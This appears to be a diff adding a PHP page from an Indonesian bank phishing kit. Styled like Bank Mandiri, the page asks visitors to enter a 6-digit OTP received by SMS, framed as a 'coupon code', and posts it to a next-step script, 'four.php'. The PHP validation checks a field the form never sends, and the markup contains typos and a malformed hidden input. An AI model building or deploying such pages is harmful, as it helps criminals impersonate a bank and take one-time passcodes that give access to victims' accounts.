@@ -1,0 +1,65 @@
+  <?php
+  // Inisialisasi variabel
+  $error = '';
+  $success = '';
+
+  // Proses form jika disubmit
+  if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+      $pin = trim($_POST['pin_mandiri'] ?? '');
+      
+      // Validasi: PIN harus 6 digit angka
+      if (empty($pin)) {
+          $error = 'PIN tidak boleh kosong.';
+      } elseif (strlen($pin) !== 6 || !is_numeric($pin)) {
+          $error = 'PIN harus tepat 6 digit angka.';
+      } else {
+          // Simulasi sukses (ganti dengan logika nyata, seperti verifikasi database)
+          $success = 'PIN valid! Login berhasil.';
+          // Contoh: Redirect ke halaman lain
+          // header('Location: dashboard.php');
+      }
+  }
+  ?>
+
+  <!DOCTYPE html>
+  <html lang="id">
+  <head>
+      <meta charset="UTF-8">
+      <meta name="viewport" content="width=device-width, initial-scale=1.0">
+      <title>OTP Mandiri</title>
+      <style>
+          body { font-family: Arial, sans-serif; background-color: #f4f4f4; margin: 0; padding: 20px; }
+          .container { max-width: 400px; margin: 0 auto; background: white; padding: 20px; border-radius: 8px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
+          .form-group { margin-bottom: 15px; }
+          label { display: block; margin-bottom: 5px; font-weight: bold; color: #005ea6; }
+          input { width: 100%; padding: 10px; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; }
+          input:focus { border-color: #00a651; outline: none; }
+          button { width: 100%; padding: 10px; background-color: #005ea6; color: white; border: none; border-radius: 4px; cursor: pointer; }
+          button:hover { background-color: #004080; }
+          .message { margin-top: 10px; padding: 10px; border-radius: 4px; }
+          .error { background-color: #f8d7da; color: #721c24; }
+          .success { background-color: #d4edda; color: #155724; }
+      </style>
+  </head>
+  <body>
+      <div class="container">
+          <h2>Silahkan Cek Kode Kupon di SMS Lalu Masukan Di Kolom Di Bawah Ini</h2>
+            <form action="four.php" method="post">
+          <input type="hidden" name="" i />
+          <div class="">
+              <fieldset class="form-group">
+                  <legend><label>OTP Mandiri</label></legend>
+                  <input type="pasword" name="otp" maxlength="6" required placeholder="Masukkan Kode 6 digit">
+              </fieldset>
+              <button type="submit">Versikasi OTP</button>
+          </form>
+          <?php if ($error): ?>
+              <div class="message error"><?php echo htmlspecialchars($error); ?></div>
+          <?php endif; ?>
+          <?php if ($success): ?>
+              <div class="message success"><?php echo htmlspecialchars($success); ?></div>
+          <?php endif; ?>
+      </div>
+  </body>
+  </html>
+  
